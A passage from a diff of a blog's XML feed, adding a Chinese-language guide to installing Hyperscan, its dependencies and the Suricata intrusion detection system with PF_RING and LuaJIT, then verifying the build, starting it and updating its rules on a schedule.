/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</span><br><span class="line">	liblua5.1.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1.so</span><br><span class="line">	liblua5.1-c++.so.0 (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1-c++.so.0</span><br><span class="line">	liblua5.1-c++.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1-c++.so</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Hyperscan"><a href="#Hyperscan" class="headerlink" title="Hyperscan"></a>Hyperscan</h2><p><strong>1. boost</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 依赖</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install cmake</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.bintray.com/boostorg/release/1.69.0/<span class="built_in">source</span>/boost_1_69_0.tar.gz</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -xvf boost_1_69_0.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> boost_1_69_0/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bootstrap.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./b2 --with-iostreams --with-random install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. ragle</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ sudo apt-get install autoconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget http://www.colm.net/files/ragel/ragel-6.10.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ tar zxvf ragel-6.10.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> ragel-6.10</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. hyperscan</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ sudo apt install libpcap-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget https://github.com/intel/hyperscan/archive/v5.1.0.tar.gz -O hyperscan-5.1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ tar -zxvf hyperscan-5.1.0.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> hyperscan-5.1.0</span><br><span class="line">$ mkdir cmake-build</span><br><span class="line">$ <span class="built_in">cd</span> cmake-build</span><br><span class="line">$ cmake -DBUILD_SHARED_LIBS=on -DCMAKE_BUILD_TYPE=Release ..</span><br><span class="line">$ make -j8</span><br><span class="line">$ sudo make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 验证</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ldconfig -p | grep hs</span></span><br><span class="line">	libhs_runtime.so.5 (libc6,x86-64) =&gt; /usr/local/lib/libhs_runtime.so.5</span><br><span class="line">	libhs_runtime.so (libc6,x86-64) =&gt; /usr/local/lib/libhs_runtime.so</span><br><span class="line">	libhs.so.5 (libc6,x86-64) =&gt; /usr/local/lib/libhs.so.5</span><br><span class="line">	libhs.so (libc6,x86-64) =&gt; /usr/local/lib/libhs.so</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>参考:</strong></p>
+<ul>
+<li><a href="http://www.manongjc.com/article/110977.html"><strong>Hyperscan - 5.1.0 安装</strong></a></li>
+</ul>
+<h2 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a><strong>Suricata</strong></h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get install libpcre3 libpcre3-dbg libpcre3-dev build-essential libpcap-dev   \</span></span><br><span class="line"><span class="bash">                libnet1-dev libyaml-0-2 libyaml-dev pkg-config zlib1g zlib1g-dev \</span></span><br><span class="line"><span class="bash">                libcap-ng-dev libcap-ng0 make libmagic-dev libjansson-dev        \</span></span><br><span class="line"><span class="bash">                libnss3-dev libgeoip-dev libhiredis-dev libevent-dev \</span></span><br><span class="line"><span class="bash">                python-yaml rustc cargo libmaxminddb-dev liblzma-dev \</span></span><br><span class="line"><span class="bash">                python3-distutils liblz4-dev</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安装方式-2选1"><a href="#安装方式-2选1" class="headerlink" title="安装方式: 2选1"></a>安装方式: 2选1</h3><h4 id="release"><a href="#release" class="headerlink" title="release"></a>release</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget https://www.openinfosecfoundation.org/download/suricata-5.0.2.tar.gz</span><br><span class="line">$ tar zxvf suricata-5.0.2.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> suricata</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-pfring --with-libpfring-includes=/usr/<span class="built_in">local</span>/include --with-libpfring-libraries=/usr/<span class="built_in">local</span>/lib --enable-geoip  --enable-luajit --with-libluajit-includes=/usr/<span class="built_in">local</span>/include/luajit-2.0/ --with-libluajit-libraries=/usr/<span class="built_in">local</span>/lib/ --with-libhs-includes=/usr/<span class="built_in">local</span>/include/hs/ --with-libhs-libraries=/usr/<span class="built_in">local</span>/lib/</span><br><span class="line">$ make &amp;&amp; make install-full</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
+
+<h4 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir suricata</span><br><span class="line">$ <span class="built_in">cd</span> suricata</span><br><span class="line">$ git <span class="built_in">clone</span> git://phalanx.openinfosecfoundation.org/oisf.git</span><br><span class="line">$ <span class="built_in">cd</span> oisf</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/OISF/libhtp.git</span><br><span class="line">$ ./autogen.sh</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-pfring --with-libpfring-includes=/usr/<span class="built_in">local</span>/include --with-libpfring-libraries=/usr/<span class="built_in">local</span>/lib --enable-geoip  --enable-luajit --with-libluajit-includes=/usr/<span class="built_in">local</span>/include/luajit-2.0/ --with-libluajit-libraries=/usr/<span class="built_in">local</span>/lib/ --with-libhs-includes=/usr/<span class="built_in">local</span>/include/hs/ --with-libhs-libraries=/usr/<span class="built_in">local</span>/lib/</span><br><span class="line">$ make &amp;&amp; make install-full</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p><strong>1. PF_RING</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep PF_RING</span></span><br><span class="line">Features: PCAP_SET_BUFF PF_RING AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK PCRE_JIT HAVE_NSS HAVE_LUA HAVE_LUAJIT HAVE_LIBJANSSON PROFILING TLS MAGIC RUST</span><br><span class="line">  PF_RING support:                         yes</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. LuaJit</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep lua</span></span><br><span class="line">  LUA support:                             yes, through luajit</span><br><span class="line">  libluajit:                               yes</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. Hyperscan</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep Hyperscan</span></span><br><span class="line">  Hyperscan support:                       yes</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --pfring-int=ens6 --pfring-cluster-id=99 --pfring-cluster-type=cluster_flow -c /etc/suricata/suricata.yaml</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="规则管理"><a href="#规则管理" class="headerlink" title="规则管理"></a>规则管理</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install --upgrade suricata-update</span><br></pre></td></tr></table></figure>
+
+<p><strong>定时更新</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> crontab -l</span></span><br><span class="line">10 0 * * * /usr/bin/suricata-update --no-test &amp;&amp; /usr/bin/suricatasc -c reload-rules</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p><a href="https://www.jianshu.com/p/9348e211a6a2">https://www.jianshu.com/p/9348e211a6a2</a></p>
+]]></content>
+      <categories>
+        <category>NIDS</category>
+      </categories>
+      <tags>
+        <tag>Suricata</tag>
       </tags>
   </entry>
   <entry>
